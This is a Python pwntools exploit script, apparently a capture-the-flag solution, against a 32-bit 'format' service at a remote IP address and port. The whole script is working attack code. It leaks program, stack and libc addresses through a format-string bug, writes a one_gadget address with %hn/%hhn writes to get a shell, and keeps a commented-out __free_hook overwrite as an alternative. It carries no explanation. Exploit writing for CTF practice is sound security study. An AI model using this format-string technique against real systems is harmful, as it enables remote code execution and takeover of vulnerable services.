from pwn import *
context.arch = 'i386'

#libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
def fuck(payload):
    io.sendlineafter("Choice:","1")
    io.sendafter("say:",payload)

one = 0x3a80e#libc.sym["system"]

while True:
    while True:
        #io = process("./format")
        io = remote("152.136.18.34",9999)
        leak = fuck("%p"*12)
        io.recvuntil("0x180x40x")
        pbase = int(io.recv(8),16)-0x8f3
        io.recvuntil("0x10x")
        sbase = int(io.recv(8),16)
        io.recvuntil("(nil)(nil)0x")
        lbase = int(io.recv(8),16)-(0xf7577637-0xf755f000)
        info("SBASE -> %#x\nLBASE -> %#x\nPBASE -> %#x"%(sbase,lbase,pbase))
        fuck("\x00"*23)

        fp = "%"+str((sbase-0x98)&0xffff)+"c%17$hn"
        fuck(fp)
        fuck("\x00"*23)

        fp = "%"+str((lbase+one)&0xffff)+"c%53$hn"
        fuck(fp)
        fuck("\x00"*23)

        fp = "%"+str((sbase-0x96)&0xff)+"c%17$hhn"
        fuck(fp)
        fuck("\x00"*23)
        fp = "%"+str(((lbase+one)&0xff0000)>>16)+"c%53$hhn"
        fuck(fp)
        fuck("\x00"*23)
        '''
        fp = "%"+str((sbase-(0xfff250e4-0xfff25040))&0xffff)+"c%17$hn"
        fuck(fp);info("1")
        fuck("\x00"*23)
        fp = "%"+str((lbase+libc.sym['__free_hook'])&0xffff)+"c%53$hn"
        fuck(fp);info("2")
        fuck("\x00"*23)
        fp = "%"+str((lbase+one)&0xff)+"c%12$hhn"
        fuck(fp);info("3")
        fuck("\x00"*23)
        fp = "%"+str((lbase+libc.sym['__free_hook']+1)&0xff)+"c%53$hhn"
        fuck(fp);info("4")
        fuck("\x00"*23)
        fp = "%"+str(((lbase+one)&0xff00)>>8)+"c%12$hhn"
        fuck(fp);info("5")
        fuck("\x00"*23)
        fp = "%"+str((lbase+libc.sym['__free_hook']+2)&0xff)+"c%53$hhn"
        fuck(fp);info("6")
        fuck("\x00"*23)
        fp = "%"+str(((lbase+one)&0xff0000)>>16)+"c%12$hhn"
        fuck(fp);info("7")
        fuck("\x00"*23)
        fp = "%"+str((lbase+libc.sym['__free_hook']+3)&0xff)+"c%53$hhn"
        fuck(fp);info("8")
        fuck("\x00"*23)
        fp = "%"+str(((lbase+one)&0xff000000)>>24)+"c%12$hhn"
        fuck(fp);info("9")

        fuck("$0%65505c")
        '''
        #gdb.attach(io,"b *%#x+0x985"%pbase)
        io.interactive()
        raw_input()